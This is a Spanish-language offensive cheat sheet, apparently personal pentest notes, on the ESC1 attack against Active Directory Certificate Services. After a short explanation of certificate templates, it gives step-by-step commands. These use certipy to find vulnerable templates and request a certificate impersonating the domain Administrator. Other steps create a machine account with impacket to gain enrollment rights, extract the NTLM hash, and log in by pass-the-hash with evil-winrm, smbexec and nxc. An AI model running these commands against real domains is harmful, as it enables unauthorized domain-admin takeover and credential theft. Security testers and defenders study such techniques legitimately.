# ADCS Attacks 

Tags: #Windows #PrivEsc #ESC #Linux #ADCS #ESC1 

Es un servicio de infraestructura de clave pública de Microsoft
	- Emitir
	- Administrar
	- Publicar / Revocar certificados digitales 

Utilidades practicas:
	- Emitir certificados para autenticación en computadores / servidores
	- Acceder a redes Wifi EMpresariales (WPA - Enterprise)
	- Acceder a redes VPN

Componentes:
- CA (Autoridad Certificadora)
- Certificate Templates 
	- Quien emite el certificado
	- Duración 
	- Quien puede usarlo 
	- Los permisos 

# ESC 1 - Overly Permissive Certificate Template

El template permite que quien solicita el certificado especifique un Subject Alternative Name (SAN). Si un usuario puede hacer enrollment en este template, puede solicitar un certificado haciéndose pasar por cualquier usuario (incluido un Domain Admin).
## Enumeración General 

```bash 
# Buscar certificados vulnerables 
❯ certipy-ad find -u 'user' -p 'P@$$w0rd123!' -dc-ip IP_DC -vulnerable -stdout

Donde se obtiene:
	- CA Name 
	- Template Name  
	- Enrollment Rights -> (Quién puede solicitar el certificado directamente)
```

## ESC 1 - Forma1: Directa 

```bash
Paso 1:
# Solicitar un certificado como Administrador 
❯ certipy-ad req -u 'user@domain.local' -p 'P@$$w0rd123!' -dc-ip IP_DC -ca 'CA_Name' -template 'Template_Name' -upn 'Administrator@domain.local' -target IP_DC 

	# ca = Certificate Authority (CA)
	# template = Nombre de la plantilla vulnerable 
	# upn = Es la identidad que quieres que represente el certificado. En este caso el usuario administrator

NOTA:
	- Se obtiene un archivo llamado 'administrator.pfx'

Paso 2:
# Autenticarse usando el certificado obtenido un TGT para obtener el HASH NTLM
❯ certipy-ad auth -pfx administrator.pfx -dc-ip IP_DC

Paso 3:
# Conectarse al server como Administrator 
❯ evil-winrm -i IP_DC -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff
```

## ESC 1 - Forma 2: Desde un grupo 

```bash 
# Si enumerando el certificado se tiene:

# Donde la enumeración muestra:
ESC1: Enrollee supplies subject and template allows client authentication

# Significa:
- Enrollee Supplies Subject = True
- Client Authentication = True
- Manager Approval = False

# ¿Quién puede solicitarlo?
User Enrollable Principals: DOMAIN.CORP\Domain Computers

# Significa:
- Las cuentas de computadora pertenecientes a "Domain Computers"
  pueden solicitar/enrollar este certificado.

# Si mi usuario no tiene Enrollment Rights:
- Revisar si puedo crear una cuenta de computadora (MAQ).
- La nueva cuenta Computer$ pertenecerá a Domain Computers.
- Esa cuenta podrá solicitar el certificado.
```

```bash 
Paso 1:
# Saber cuántas cuentas de computadora puede crear un usuario normal del dominio
❯ nxc ldap IP_DC -u user -p 'P@$$w0rd123!' -M maq 
```

```bash 
Paso 2:
# Crear una cuenta de computadora 
❯ impacket-addcomputer domain.corp/user:'P@$$w0rd123!' -dc-ip IP_DC -computer-name 'Computer1' -computer-pass 'C0mput3r123!'

	# computer-name = Nombre del objeto computador a crear
	# computer-pass = Contraseña del objeto computador 

NOTA:
	- El comando agregará el símbolo '$' al final y quedará: 'Computer1$'
```

```bash 
# Solicitar el certificado de autenticación 

Paso 3:
❯ certipy-ad req -u 'Computer1$' -p 'C0mput3r123!' -dc-ip IP_DC -ca CA_NAME -template 'Template_Name' -upn 'Administrator@domain.corp' -sid '<Target_User_SID>'

	# upn = Usuario a impersonar 
	# sid = Requerido si hay un SID mismatch error
	# Ejemplo del SID:
		S-1-5-21-1496966362-3320961333-4044918980-500


❯ impacket-lookupsid domain.corp/user:'P@$$w0rd123!'@IP_DC
	# Resultado:
	[*] Domain SID is: S-1-5-21-1496966362-3320961333-4044918980
	498: ANOMALY\Enterprise Read-only Domain Controllers (SidTypeGroup)
	500: ANOMALY\Administrator (SidTypeUser)
```

```bash 
Paso 4:
# Autenticación vía PFX
❯ certipy-ad auth -pfx 'Administrator.pfx' -dc-ip IP_DC
```

```bash
Paso 5:
# Mirar si se puede ingresar con ese hash 
❯ nxc smb IP_DC -u administrator -H be4bf3131851aee9a424c58e02879f6e
❯ nxc winrm IP_DC -u administrator -H be4bf3131851aee9a424c58e02879f6e
 
Paso 6:
# Conectarse al server 
❯ impacket-smbexec 'Administrator'@<IP> -hashes LM:NT
❯ evil-winrm -i IP_DC -u Administrator 

NOTA:
	- Si no funciona utilizar 'WMIExec2' para la evasión y conexión mediante WMI
```